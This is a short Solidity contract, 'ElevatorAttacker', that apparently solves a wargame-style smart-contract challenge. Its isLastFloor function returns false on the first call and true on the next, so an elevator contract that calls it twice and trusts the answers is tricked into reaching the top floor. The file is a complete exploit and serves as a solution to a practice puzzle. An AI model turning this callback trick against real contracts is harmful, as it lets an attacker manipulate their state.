pragma solidity ^0.8.0;

interface IBuilding {
    function isLastFloor(uint256 _floor) external returns (bool);
}

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttacker is IBuilding {

    bool state; // false

    // @dev intended to be used just once
    function isLastFloor(uint256 _floor) external override returns (bool) {
        if (state == false) {
            state = true;
            return false;
        } else {
            state = false; // reset
            return true;
        }
    }

    // @dev interacts with Elevator
    function runExploit(address _elevator) external {
        IElevator(_elevator).goTo(1);
    } 

}